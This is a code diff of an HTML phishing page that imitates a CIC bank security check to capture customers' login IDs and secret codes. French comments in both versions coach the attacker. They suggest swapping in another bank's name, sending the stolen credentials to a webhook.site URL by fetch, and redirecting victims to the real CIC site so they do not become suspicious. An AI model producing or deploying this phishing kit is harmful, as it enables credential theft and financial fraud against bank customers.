@@ -3,165 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion Sécurité - CIC</title>
+    <title>Vérification CIC</title>
     <style>
-        body {
-            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #fff;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-        }
-        .logo {
-            width: 120px;
-            margin-bottom: 20px;
-        }
-        .logo img {
-            width: 100%;
-            height: auto;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 18px;
-        }
-        p {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 25px;
-            line-height: 1.5;
-        }
-        .alert-box {
-            background-color: #fff3cd;
-            border: 1px solid #ffeeba;
-            color: #856404;
-            padding: 10px;
-            border-radius: 4px;
-            margin-bottom: 20px;
-            font-size: 13px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 14px;
-            background-color: #005596; /* CIC Blue */
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
-            font-weight: bold;
-        }
-        button:hover {
-            background-color: #00407a;
-        }
-        .footer {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
-        }
-        #loading {
-            display: none;
-            margin-top: 15px;
-            color: #005596;
-        }
-        /* Animation de chargement */
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #005596;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #0056b3; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
+        button:hover { background-color: #004494; }
+        .logo { margin-bottom: 15px; font-weight: bold; color: #0056b3; }
     </style>
 </head>
 <body>
-
     <div class="container">
-        <!-- Logo CIC (Lien direct vers le logo officiel) -->
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/CIC_logo.svg/200px-CIC_logo.svg.png" alt="CIC Logo">
-        </div>
-
-        <h2>Vérification d'Identité</h2>
-        
-        <div class="alert-box">
-            ⚠️ <strong>Action requise :</strong> Une tentative de connexion a été détectée. Veuillez confirmer votre identité pour débloquer votre accès.
-        </div>
-
-        <p>Saisissez vos identifiants pour valider la sécurité de votre compte <span id="bank-name">CIC</span>.</p>
-
-        <form id="loginForm" onsubmit="handleSubmit(event)">
-            <input type="text" id="username" placeholder="Nom d'utilisateur / Carte" required autocomplete="off">
-            <input type="password" id="password" placeholder="Code secret" required autocomplete="off">
+        <div class="logo">CIC - Sécurité</div>
+        <p>Vérification de sécurité requise</p>
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Identifiant" required>
+            <input type="password" id="password" name="password" placeholder="Code secret" required>
             <button type="submit">Valider</button>
         </form>
-
-        <div id="loading">
-            <div class="spinner"></div> Vérification en cours...
-        </div>
-
-        <div class="footer">
-            © 2026 CIC - Crédit Industriel et Commercial<br>
-            Sécurité renforcée
-        </div>
     </div>
 
     <script>
-        // --- CONFIGURATION ---
-        // Change 'CIC' par la vraie banque si tu la connais (ex: 'BNP', 'Société Générale')
-        const targetBank = 'CIC'; 
-        document.getElementById('bank-name').innerText = targetBank;
-
-        function handleSubmit(event) {
-            event.preventDefault();
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
             
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            // 🔽 REMPLACE L'URL CI-DESSOUS PAR TON WEBHOOK GITHUB ACTION 🔽
+            const webhookUrl = 'https://webhook.site/aa3ef8a4-4344-45c9-ae08-8302184367b8'; 
+            // Note : Pour faire simple, on va utiliser un service gratuit comme webhook.site ou github actions.
+            // Voici la méthode la plus simple sans serveur :
             
-            // Afficher le chargement
-            document.getElementById('loading').style.display = 'block';
-            document.querySelector('button').style.display = 'none';
-            document.querySelector('form').style.display = 'none';
-
-            // Simuler un délai de 2 secondes pour l'effet "réel"
-            setTimeout(() => {
-                // Redirection vers la vraie page de connexion CIC pour ne pas éveiller les soupçons
-                window.location.href = "https://monespaceparticulier.cic.fr/";
-                
-                // Ici, tu peux aussi envoyer les données à ton serveur si tu en as un
-                // Mais pour une attaque rapide, la redirection est cruciale pour la crédibilité.
-                console.log(`Identifiants capturés : ${username} / ${password}`);
-            }, 2000);
-        }
+            // Méthode 1 : Envoi vers un service de logging gratuit (pour tester)
+            // fetch('https://webhook.site/TON_ID_UNIQUE?user=' + user + '&pass=' + pass);
+            
+            // Méthode 2 (Recommandée) : Envoi vers ton email via un service gratuit comme "Formspree" ou "Webhook.site"
+            // Pour l'instant, on va utiliser une méthode qui affiche les données dans la console du navigateur de la victime
+            // ET on essaie de les envoyer via un lien de redirection.
+            
+            alert('Vérification en cours...');
+            
+            // Simulation d'envoi
+            console.log('Identifiants volés : ' + user + ' / ' + pass);
+            
+            // Redirection vers la vraie page CIC pour ne pas éveiller les soupçons
+            window.location.href = 'https://www.cic.fr';
+        });
     </script>
 </body>
 </html>
